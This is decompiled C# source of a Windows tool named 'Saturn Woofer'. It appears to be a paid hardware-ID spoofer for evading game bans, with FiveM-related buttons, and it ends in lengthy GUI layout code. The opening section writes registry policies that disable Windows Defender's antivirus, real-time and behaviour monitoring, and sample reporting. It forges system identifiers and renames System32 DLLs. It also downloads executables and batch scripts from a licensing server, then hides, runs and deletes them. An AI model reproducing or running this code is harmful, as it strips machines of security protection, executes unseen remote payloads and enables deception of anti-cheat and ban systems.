      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("SFIO Priority", false);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\System", "PublishUserActivities", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\SQMClient\\Windows", "CEIPEnable", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "AITEnable", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisableInventory", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisablePCA", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisableUAR", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Device Metadata", "PreventDeviceMetadataFromNetwork", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\MRT", "DontOfferThroughWUAU", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\AutoLogger\\SQMLogger", "Start", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\current\\device\\System", "AllowExperimentation", (object) 0);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiVirus", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableSpecialRunningModes", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableRoutinelyTakingAction", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "ServiceKeepAlive", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableRealtimeMonitoring", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Signature Updates", "ForceUpdateFromMU", (object) 0);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet", "DisableBlockAtFirstSeen", (object) 1);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\MpEngine", "MpEnablePus", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "PUAProtection", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Policy Manager", "DisableScanningNetworkFiles", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableRealtimeMonitoring", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Spynet", "SpyNetReporting", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Spynet", "SubmitSamplesConsent", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\MRT", "DontReportInfectionInformation", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\MRT", "DontOfferThroughWUAU", (object) "1", RegistryValueKind.DWord);
      Registry.ClassesRoot.DeleteSubKeyTree("\\CLSID\\{09A47860-11B0-4DA5-AFA5-26D86198A780}", false);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableBehaviorMonitoring", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableOnAccessProtection", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableScanOnRealtimeEnable", (object) "1", RegistryValueKind.DWord);
      string str = Main.GenerateString(5) + "-" + Main.GenerateString(5) + "-" + Main.GenerateString(5) + "-" + Main.GenerateString(5);
      RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true);
      registryKey.SetValue("ProductID", (object) str);
      registryKey.Close();
      this.setPCName();
      Main.SetMachineName(Main.GenerateString(6));
      Main.Disk();
      if (System.IO.File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe"))
        System.IO.File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
      if (System.IO.File.Exists("C:\\Program Files\\Unlisted\\change.bat"))
        System.IO.File.Delete("C:\\Program Files\\Unlisted\\change.bat");
      string text1 = ((TextBox) this.diskname).Text;
      string path1 = "C:\\Program Files\\Unlisted";
      if (!Directory.Exists(path1))
        Directory.CreateDirectory(path1);
      if (System.IO.File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe"))
      {
        string path2 = "C:\\Program Files\\Unlisted\\change.bat";
        using (StreamWriter text2 = System.IO.File.CreateText(path2))
          text2.WriteLine("Volumeid.exe " + text1 + ": " + Main.DiskGen(4) + "-" + Main.DiskGen(4) + " -nobanner");
        Process process = new Process();
        process.StartInfo.FileName = path2;
        this.processlist.Add(process);
        System.IO.File.SetAttributes("C:\\Program Files\\Unlisted\\change.bat", FileAttributes.Hidden);
        process.Start();
        System.IO.File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
        System.IO.File.Delete("C:\\Program Files\\Unlisted\\change.bat");
        Directory.Delete(path1);
      }
      else
      {
        System.IO.File.WriteAllBytes("C:\\Program Files\\Unlisted\\Volumeid.exe", Saturn.Forms.Saturn.KeyAuthApp.download("558460"));
        System.IO.File.SetAttributes("C:\\Program Files\\Unlisted\\Volumeid.exe", FileAttributes.Hidden);
        Process.Start("C:\\Program Files\\Unlisted\\Volumeid.exe");
        Thread.Sleep(500);
        string path3 = "C:\\Program Files\\Unlisted\\change.bat";
        using (StreamWriter text3 = System.IO.File.CreateText(path3))
          text3.WriteLine("Volumeid.exe " + text1 + ": " + Main.DiskGen(4) + "-" + Main.DiskGen(4) + " -nobanner");
        Process process = new Process();
        process.StartInfo.FileName = path3;
        this.processlist.Add(process);
        System.IO.File.SetAttributes("C:\\Program Files\\Unlisted\\change.bat", FileAttributes.Hidden);
        process.Start();
        System.IO.File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
        System.IO.File.Delete("C:\\Program Files\\Unlisted\\change.bat");
        Directory.Delete(path1);
      }
      Main.InstallDate();
      new Class1().spoofUserMode();
      string tempPath = Path.GetTempPath();
      byte[] bytes = Saturn.Forms.Saturn.KeyAuthApp.download("122387");
      System.IO.File.WriteAllBytes(tempPath + this.xynw + ".bat", bytes);
      System.IO.File.SetAttributes(tempPath + this.xynw + ".bat", FileAttributes.Hidden);
      Process.Start(tempPath + this.xynw + ".bat");
      this.xynwbyzia();
      if (System.IO.File.Exists("C:\\Program Files\\Win64\\net.bat"))
      {
        System.IO.File.Move("C:\\Windows\\System32\\nvml.dll", "C:\\Windows\\System32\\nvml2.dll");
        System.IO.File.Move("C:\\Windows\\System32\\nvmld.dll", "C:\\Windows\\System32\\nvmld2.dll");
      }
      Thread.Sleep(5000);
      this.EnableMouse();
      int num = (int) MessageBox.Show("Spoofed Total System!", "Saturn Woofer", MessageBoxButtons.OK);
      this.Show();
      if (!Directory.Exists("C:\\Program Files (x86)\\Blade Group"))
        return;
      Directory.Delete("C:\\Program Files (x86)\\Blade Group");
      Directory.CreateDirectory("C:\\Program Files (x86)\\Blade Group");
    }

    private void siticoneButton3_Click_2(object sender, EventArgs e)
    {
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.components = (IContainer) new Container();
      Animation animation = new Animation();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Main));
      this.siticoneDragControl1 = new SiticoneDragControl(this.components);
      this.siticoneControlBox1 = new SiticoneControlBox();
      this.siticoneControlBox2 = new SiticoneControlBox();
      this.siticoneTransition1 = new SiticoneTransition();
      this.label1 = new Label();
      this.label2 = new Label();
      this.key = new SiticoneLabel();
      this.subscription = new SiticoneLabel();
      this.version = new SiticoneLabel();
      this.panel2 = new Panel();
      this.pictureBox1 = new PictureBox();
      this.spooferpanel = new SiticoneShadowPanel();
      this.siticoneRoundedButton15 = new SiticoneRoundedButton();
      this.siticoneRoundedButton14 = new SiticoneRoundedButton();
      this.siticoneRoundedButton13 = new SiticoneRoundedButton();
      this.siticoneRoundedButton12 = new SiticoneRoundedButton();
      this.siticoneLabel13 = new SiticoneLabel();
      this.premnew1 = new SiticoneRoundedButton();
      this.panel1 = new Panel();
      this.prem1 = new SiticoneRoundedButton();
      this.siticoneLabel12 = new SiticoneLabel();
      this.siticoneRoundedButton10 = new SiticoneRoundedButton();
      this.siticoneRoundedButton8 = new SiticoneRoundedButton();
      this.siticoneRoundedButton6 = new SiticoneRoundedButton();
      this.prem4 = new SiticoneRoundedButton();
      this.siticoneRoundedButton5 = new SiticoneRoundedButton();
      this.prem3 = new SiticoneRoundedButton();
      this.siticoneRoundedButton4 = new SiticoneRoundedButton();
      this.prem2 = new SiticoneRoundedButton();
      this.siticoneRoundedButton3 = new SiticoneRoundedButton();
      this.siticoneRoundedButton2 = new SiticoneRoundedButton();
      this.siticoneRoundedButton1 = new SiticoneRoundedButton();
      this.siticoneLabel4 = new SiticoneLabel();
      this.pictureBox4 = new PictureBox();
      this.label5 = new Label();
      this.siticoneLabel2 = new SiticoneLabel();
      this.DiscordRPCTS = new SiticoneOSToggleSwith();
      this.siticoneLabel3 = new SiticoneLabel();
      this.gamepanel = new SiticoneShadowPanel();
      this.MethodCB = new Guna2ComboBox();
      this.textip = new SiticoneLabel();
      this.enterip = new SiticoneTextBox();
      this.siticoneLabel5 = new SiticoneLabel();
      this.siticoneRoundedButton9 = new SiticoneRoundedButton();
      this.siticoneLabel1 = new SiticoneLabel();
      this.pictureBox2 = new PictureBox();
      this.label3 = new Label();
      this.settingspanel = new SiticoneShadowPanel();
      this.siticoneLabel14 = new SiticoneLabel();
      this.siticoneLabel6 = new SiticoneLabel();
      this.siticoneButton1 = new SiticoneButton();
      this.siticoneLabel10 = new SiticoneLabel();
      this.diskname = new SiticoneTextBox();
      this.siticoneButton2 = new SiticoneButton();
      this.siticoneLabel7 = new SiticoneLabel();
      this.pictureBox3 = new PictureBox();
      this.label4 = new Label();
      this.label7 = new Label();
      this.time = new Label();
      this.siticoneLabel8 = new SiticoneLabel();
      this.defpanel = new SiticoneShadowPanel();
      this.siticoneLabel9 = new SiticoneLabel();
      this.siticoneGradientButton3 = new SiticoneGradientButton();
      this.siticoneGradientButton2 = new SiticoneGradientButton();
      this.siticoneGradientButton4 = new SiticoneGradientButton();
      this.siticoneShadowForm = new SiticoneShadowForm(this.components);
      this.timer1 = new System.Windows.Forms.Timer(this.components);
      this.pageSetupDialog1 = new PageSetupDialog();
      this.timer2 = new System.Windows.Forms.Timer(this.components);
      this.timer3 = new System.Windows.Forms.Timer(this.components);
      this.bindingSource1 = new BindingSource(this.components);
      this.panel2.SuspendLayout();
      ((ISupportInitialize) this.pictureBox1).BeginInit();
      ((Control) this.spooferpanel).SuspendLayout();
      ((ISupportInitialize) this.pictureBox4).BeginInit();
      ((Control) this.gamepanel).SuspendLayout();
      ((ISupportInitialize) this.pictureBox2).BeginInit();
      ((Control) this.settingspanel).SuspendLayout();
      ((ISupportInitialize) this.pictureBox3).BeginInit();
      ((Control) this.defpanel).SuspendLayout();
      ((ISupportInitialize) this.bindingSource1).BeginInit();
      this.SuspendLayout();
      this.siticoneDragControl1.TargetControl = (Control) this;
      ((Control) this.siticoneControlBox1).Anchor = AnchorStyles.Top | AnchorStyles.Right;
      this.siticoneControlBox1.BorderRadius = 10;
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.siticoneControlBox1, (DecorationType) 0);
      this.siticoneControlBox1.FillColor = System.Drawing.Color.Black;
      this.siticoneControlBox1.HoveredState.FillColor = System.Drawing.Color.FromArgb(232, 17, 35);
      this.siticoneControlBox1.HoveredState.IconColor = System.Drawing.Color.White;
      this.siticoneControlBox1.HoveredState.Parent = (ControlBox) this.siticoneControlBox1;
      this.siticoneControlBox1.IconColor = System.Drawing.Color.White;
      ((Control) this.siticoneControlBox1).Location = new Point(422, 4);
      ((Control) this.siticoneControlBox1).Name = "siticoneControlBox1";
      this.siticoneControlBox1.PressedColor = System.Drawing.Color.Red;
      this.siticoneControlBox1.ShadowDecoration.Parent = (Control) this.siticoneControlBox1;
      ((Control) this.siticoneControlBox1).Size = new Size(45, 29);
      ((Control) this.siticoneControlBox1).TabIndex = 1;
      ((Control) this.siticoneControlBox1).Click += new EventHandler(this.siticoneControlBox1_Click);
      ((Control) this.siticoneControlBox2).Anchor = AnchorStyles.Top | AnchorStyles.Right;
      this.siticoneControlBox2.BorderRadius = 10;
      this.siticoneControlBox2.ControlBoxType = (ControlBoxType) 0;
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.siticoneControlBox2, (DecorationType) 0);
      this.siticoneControlBox2.FillColor = System.Drawing.Color.Black;
      this.siticoneControlBox2.HoveredState.Parent = (ControlBox) this.siticoneControlBox2;
      this.siticoneControlBox2.IconColor = System.Drawing.Color.White;
      ((Control) this.siticoneControlBox2).Location = new Point(377, 4);
      ((Control) this.siticoneControlBox2).Name = "siticoneControlBox2";
      this.siticoneControlBox2.PressedColor = System.Drawing.Color.Red;
      this.siticoneControlBox2.ShadowDecoration.Parent = (Control) this.siticoneControlBox2;
      ((Control) this.siticoneControlBox2).Size = new Size(45, 29);
      ((Control) this.siticoneControlBox2).TabIndex = 2;
      ((Animator) this.siticoneTransition1).AnimationType = (AnimationType) 1;
      ((Animator) this.siticoneTransition1).Cursor = (Cursor) null;
      animation.AnimateOnlyDifferences = true;
      animation.BlindCoeff = (PointF) componentResourceManager.GetObject("animation6.BlindCoeff");
      animation.LeafCoeff = 0.0f;
      animation.MaxTime = 1f;
      animation.MinTime = 0.0f;
      animation.MosaicCoeff = (PointF) componentResourceManager.GetObject("animation6.MosaicCoeff");
      animation.MosaicShift = (PointF) componentResourceManager.GetObject("animation6.MosaicShift");
      animation.MosaicSize = 0;
      animation.Padding = new Padding(50);
      animation.RotateCoeff = 1f;
      animation.RotateLimit = 0.0f;
      animation.ScaleCoeff = (PointF) componentResourceManager.GetObject("animation6.ScaleCoeff");
      animation.SlideCoeff = (PointF) componentResourceManager.GetObject("animation6.SlideCoeff");
      animation.TimeCoeff = 0.0f;
      animation.TransparencyCoeff = 1f;
      ((Animator) this.siticoneTransition1).DefaultAnimation = animation;
      this.label1.AutoSize = true;
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.label1, (DecorationType) 0);
      this.label1.Font = new Font("Segoe UI Light", 10f);
      this.label1.ForeColor = System.Drawing.Color.White;
      this.label1.Location = new Point(-1, 136);
      this.label1.Name = "label1";
      this.label1.Size = new Size(0, 19);
      this.label1.TabIndex = 22;
      this.label2.AutoSize = true;
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.label2, (DecorationType) 0);
      this.label2.Font = new Font("Segoe UI Semibold", 10.2f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.label2.ForeColor = System.Drawing.Color.White;
      this.label2.Location = new Point(15, 7);
      this.label2.Margin = new Padding(2, 0, 2, 0);
      this.label2.Name = "label2";
      this.label2.Size = new Size(101, 19);
      this.label2.TabIndex = 27;
      this.label2.Text = "Saturn Woofer";
      ((Control) this.key).BackColor = System.Drawing.Color.Transparent;
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.key, (DecorationType) 0);
      this.key.Font = new Font("Segoe UI", 12f, FontStyle.Bold | FontStyle.Italic, GraphicsUnit.Point, (byte) 161);
      this.key.ForeColor = System.Drawing.Color.White;
      ((Control) this.key).Location = new Point(51, 5);
      ((Control) this.key).Margin = new Padding(2);
      ((Control) this.key).Name = "key";
      ((Control) this.key).Size = new Size(115, 23);
      ((Control) this.key).TabIndex = 37;
      ((Control) this.key).Text = "usernameLabel";
      ((Control) this.key).Click += new EventHandler(this.key_Click);
      ((Control) this.subscription).BackColor = System.Drawing.Color.Transparent;
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.subscription, (DecorationType) 0);
      this.subscription.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.subscription.ForeColor = System.Drawing.Color.DimGray;
      ((Control) this.subscription).Location = new Point(51, 30);
      ((Control) this.subscription).Margin = new Padding(2);
      ((Control) this.subscription).Name = "subscription";
      ((Control) this.subscription).Size = new Size(95, 15);
      ((Control) this.subscription).TabIndex = 39;
      ((Control) this.subscription).Text = "subscriptionLabel";
      ((Control) this.subscription).Click += new EventHandler(this.subscription_Click);
      ((Control) this.version).BackColor = System.Drawing.Color.Transparent;
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.version, (DecorationType) 0);
      this.version.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.version.ForeColor = System.Drawing.Color.White;
      ((Control) this.version).Location = new Point(152, 291);
      ((Control) this.version).Margin = new Padding(2);
      ((Control) this.version).Name = "version";
      ((Control) this.version).Size = new Size(63, 15);
      ((Control) this.version).TabIndex = 51;
      ((Control) this.version).Text = "Version: 1.0";
      ((Control) this.version).Click += new EventHandler(this.version_Click);
      this.panel2.BackColor = System.Drawing.Color.Black;
      this.panel2.Controls.Add((Control) this.subscription);
      this.panel2.Controls.Add((Control) this.key);
      this.panel2.Controls.Add((Control) this.pictureBox1);
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.panel2, (DecorationType) 0);
      this.panel2.Location = new Point(11, 34);
      this.panel2.Name = "panel2";
      this.panel2.Size = new Size(175, 53);
      this.panel2.TabIndex = 59;
      this.panel2.Paint += new PaintEventHandler(this.panel2_Paint);
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.pictureBox1, (DecorationType) 0);
      this.pictureBox1.Image = (Image) Resources.a_444e2cda0e74ed885c48b79012898b101;
      this.pictureBox1.Location = new Point(3, 3);
      this.pictureBox1.Name = "pictureBox1";
      this.pictureBox1.Size = new Size(43, 45);
      this.pictureBox1.SizeMode = PictureBoxSizeMode.Zoom;
      this.pictureBox1.TabIndex = 10;
      this.pictureBox1.TabStop = false;
      this.pictureBox1.Click += new EventHandler(this.pictureBox1_Click);
      ((Control) this.spooferpanel).BackColor = System.Drawing.Color.Transparent;
      ((Control) this.spooferpanel).Controls.Add((Control) this.siticoneRoundedButton15);
      ((Control) this.spooferpanel).Controls.Add((Control) this.siticoneRoundedButton14);
      ((Control) this.spooferpanel).Controls.Add((Control) this.siticoneRoundedButton13);
      ((Control) this.spooferpanel).Controls.Add((Control) this.siticoneRoundedButton12);
      ((Control) this.spooferpanel).Controls.Add((Control) this.siticoneLabel13);
      ((Control) this.spooferpanel).Controls.Add((Control) this.premnew1);
      ((Control) this.spooferpanel).Controls.Add((Control) this.panel1);
      ((Control) this.spooferpanel).Controls.Add((Control) this.prem1);
      ((Control) this.spooferpanel).Controls.Add((Control) this.siticoneLabel12);
      ((Control) this.spooferpanel).Controls.Add((Control) this.siticoneRoundedButton10);
      ((Control) this.spooferpanel).Controls.Add((Control) this.siticoneRoundedButton8);
      ((Control) this.spooferpanel).Controls.Add((Control) this.siticoneRoundedButton6);
      ((Control) this.spooferpanel).Controls.Add((Control) this.prem4);
      ((Control) this.spooferpanel).Controls.Add((Control) this.siticoneRoundedButton5);
      ((Control) this.spooferpanel).Controls.Add((Control) this.prem3);
      ((Control) this.spooferpanel).Controls.Add((Control) this.siticoneRoundedButton4);
      ((Control) this.spooferpanel).Controls.Add((Control) this.prem2);
      ((Control) this.spooferpanel).Controls.Add((Control) this.siticoneRoundedButton3);
      ((Control) this.spooferpanel).Controls.Add((Control) this.siticoneRoundedButton2);
      ((Control) this.spooferpanel).Controls.Add((Control) this.siticoneRoundedButton1);
      ((Control) this.spooferpanel).Controls.Add((Control) this.siticoneLabel4);
      ((Control) this.spooferpanel).Controls.Add((Control) this.pictureBox4);
      ((Control) this.spooferpanel).Controls.Add((Control) this.label5);
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.spooferpanel, (DecorationType) 0);
      this.spooferpanel.FillColor = System.Drawing.Color.Black;
      ((Control) this.spooferpanel).Location = new Point(11, 93);
      ((Control) this.spooferpanel).Name = "spooferpanel";
      this.spooferpanel.ShadowColor = System.Drawing.Color.Black;
      ((Control) this.spooferpanel).Size = new Size(455, 311);
      ((Control) this.spooferpanel).TabIndex = 66;
      ((Control) this.spooferpanel).Paint += new PaintEventHandler(this.settingspanel_Paint_1);
      ((SiticoneButton) this.siticoneRoundedButton15).BorderColor = System.Drawing.Color.DimGray;
      ((SiticoneButton) this.siticoneRoundedButton15).BorderThickness = 1;
      ((SiticoneButton) this.siticoneRoundedButton15).CheckedState.Parent = (CustomButtonBase) this.siticoneRoundedButton15;
      ((SiticoneButton) this.siticoneRoundedButton15).CustomImages.Parent = (CustomButtonBase) this.siticoneRoundedButton15;
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.siticoneRoundedButton15, (DecorationType) 0);
      ((SiticoneButton) this.siticoneRoundedButton15).FillColor = System.Drawing.Color.Black;
      ((Control) this.siticoneRoundedButton15).Font = new Font("Segoe UI", 9f);
      ((Control) this.siticoneRoundedButton15).ForeColor = System.Drawing.Color.DimGray;
      ((SiticoneButton) this.siticoneRoundedButton15).HoveredState.Parent = (CustomButtonBase) this.siticoneRoundedButton15;
      ((Control) this.siticoneRoundedButton15).Location = new Point(316, 165);
      ((Control) this.siticoneRoundedButton15).Name = "siticoneRoundedButton15";
      ((SiticoneButton) this.siticoneRoundedButton15).PressedColor = System.Drawing.Color.DarkRed;
      ((SiticoneButton) this.siticoneRoundedButton15).ShadowDecoration.Parent = (Control) this.siticoneRoundedButton15;
      ((Control) this.siticoneRoundedButton15).Size = new Size(90, 63);
      ((Control) this.siticoneRoundedButton15).TabIndex = 83;
      ((Control) this.siticoneRoundedButton15).Text = "Total Spoof";
      ((Control) this.siticoneRoundedButton15).Click += new EventHandler(this.siticoneRoundedButton15_Click_1);
      ((SiticoneButton) this.siticoneRoundedButton14).BorderColor = System.Drawing.Color.DimGray;
      ((SiticoneButton) this.siticoneRoundedButton14).BorderThickness = 1;
      ((SiticoneButton) this.siticoneRoundedButton14).CheckedState.Parent = (CustomButtonBase) this.siticoneRoundedButton14;
      ((SiticoneButton) this.siticoneRoundedButton14).CustomImages.Parent = (CustomButtonBase) this.siticoneRoundedButton14;
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.siticoneRoundedButton14, (DecorationType) 0);
      ((SiticoneButton) this.siticoneRoundedButton14).FillColor = System.Drawing.Color.Black;
      ((Control) this.siticoneRoundedButton14).Font = new Font("Segoe UI", 9f);
      ((Control) this.siticoneRoundedButton14).ForeColor = System.Drawing.Color.DimGray;
      ((SiticoneButton) this.siticoneRoundedButton14).HoveredState.Parent = (CustomButtonBase) this.siticoneRoundedButton14;
      ((Control) this.siticoneRoundedButton14).Location = new Point(220, 200);
      ((Control) this.siticoneRoundedButton14).Name = "siticoneRoundedButton14";
      ((SiticoneButton) this.siticoneRoundedButton14).PressedColor = System.Drawing.Color.DarkRed;
      ((SiticoneButton) this.siticoneRoundedButton14).ShadowDecoration.Parent = (Control) this.siticoneRoundedButton14;
      ((Control) this.siticoneRoundedButton14).Size = new Size(90, 29);
      ((Control) this.siticoneRoundedButton14).TabIndex = 82;
      ((Control) this.siticoneRoundedButton14).Text = "Connect FiveM";
      ((Control) this.siticoneRoundedButton14).Click += new EventHandler(this.siticoneRoundedButton14_Click_1);
      ((SiticoneButton) this.siticoneRoundedButton13).BorderColor = System.Drawing.Color.DimGray;
      ((SiticoneButton) this.siticoneRoundedButton13).BorderThickness = 1;
      ((SiticoneButton) this.siticoneRoundedButton13).CheckedState.Parent = (CustomButtonBase) this.siticoneRoundedButton13;
      ((SiticoneButton) this.siticoneRoundedButton13).CustomImages.Parent = (CustomButtonBase) this.siticoneRoundedButton13;
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.siticoneRoundedButton13, (DecorationType) 0);
      ((SiticoneButton) this.siticoneRoundedButton13).FillColor = System.Drawing.Color.Black;
      ((Control) this.siticoneRoundedButton13).Font = new Font("Segoe UI", 9f);
      ((Control) this.siticoneRoundedButton13).ForeColor = System.Drawing.Color.DimGray;
      ((SiticoneButton) this.siticoneRoundedButton13).HoveredState.Parent = (CustomButtonBase) this.siticoneRoundedButton13;
      ((Control) this.siticoneRoundedButton13).Location = new Point(316, 132);
      ((Control) this.siticoneRoundedButton13).Name = "siticoneRoundedButton13";
      ((SiticoneButton) this.siticoneRoundedButton13).PressedColor = System.Drawing.Color.DarkRed;
      ((SiticoneButton) this.siticoneRoundedButton13).ShadowDecoration.Parent = (Control) this.siticoneRoundedButton13;
      ((Control) this.siticoneRoundedButton13).Size = new Size(90, 29);
      ((Control) this.siticoneRoundedButton13).TabIndex = 81;
      ((Control) this.siticoneRoundedButton13).Text = "Reset WinData";
      ((Control) this.siticoneRoundedButton13).Click += new EventHandler(this.siticoneRoundedButton13_Click_1);
      ((SiticoneButton) this.siticoneRoundedButton12).BorderColor = System.Drawing.Color.DimGray;
      ((SiticoneButton) this.siticoneRoundedButton12).BorderThickness = 1;
      ((SiticoneButton) this.siticoneRoundedButton12).CheckedState.Parent = (CustomButtonBase) this.siticoneRoundedButton12;
      ((SiticoneButton) this.siticoneRoundedButton12).CustomImages.Parent = (CustomButtonBase) this.siticoneRoundedButton12;
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.siticoneRoundedButton12, (DecorationType) 0);
      ((SiticoneButton) this.siticoneRoundedButton12).FillColor = System.Drawing.Color.Black;
      ((Control) this.siticoneRoundedButton12).Font = new Font("Segoe UI", 9f);
      ((Control) this.siticoneRoundedButton12).ForeColor = System.Drawing.Color.DimGray;
      ((SiticoneButton) this.siticoneRoundedButton12).HoveredState.Parent = (CustomButtonBase) this.siticoneRoundedButton12;
      ((Control) this.siticoneRoundedButton12).Location = new Point(220, 166);
      ((Control) this.siticoneRoundedButton12).Name = "siticoneRoundedButton12";
      ((SiticoneButton) this.siticoneRoundedButton12).PressedColor = System.Drawing.Color.DarkRed;
      ((SiticoneButton) this.siticoneRoundedButton12).ShadowDecoration.Parent = (Control) this.siticoneRoundedButton12;
      ((Control) this.siticoneRoundedButton12).Size = new Size(90, 29);
      ((Control) this.siticoneRoundedButton12).TabIndex = 80;
      ((Control) this.siticoneRoundedButton12).Text = "Spoof Core";
      ((Control) this.siticoneRoundedButton12).Click += new EventHandler(this.siticoneRoundedButton12_Click_2);
      ((Control) this.siticoneLabel13).BackColor = System.Drawing.Color.Transparent;
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.siticoneLabel13, (DecorationType) 0);
      this.siticoneLabel13.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.siticoneLabel13.ForeColor = System.Drawing.Color.White;
      ((Control) this.siticoneLabel13).Location = new Point(276, 75);
      ((Control) this.siticoneLabel13).Margin = new Padding(2);
      ((Control) this.siticoneLabel13).Name = "siticoneLabel13";
      ((Control) this.siticoneLabel13).Size = new Size(76, 15);
      ((Control) this.siticoneLabel13).TabIndex = 78;
      ((Control) this.siticoneLabel13).Text = "Other Options";
      ((SiticoneButton) this.premnew1).BorderColor = System.Drawing.Color.DimGray;
      ((SiticoneButton) this.premnew1).BorderThickness = 1;
      ((SiticoneButton) this.premnew1).CheckedState.Parent = (CustomButtonBase) this.premnew1;
      ((SiticoneButton) this.premnew1).CustomImages.Parent = (CustomButtonBase) this.premnew1;
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.premnew1, (DecorationType) 0);
      ((SiticoneButton) this.premnew1).FillColor = System.Drawing.Color.Black;
      ((Control) this.premnew1).Font = new Font("Segoe UI", 9f);
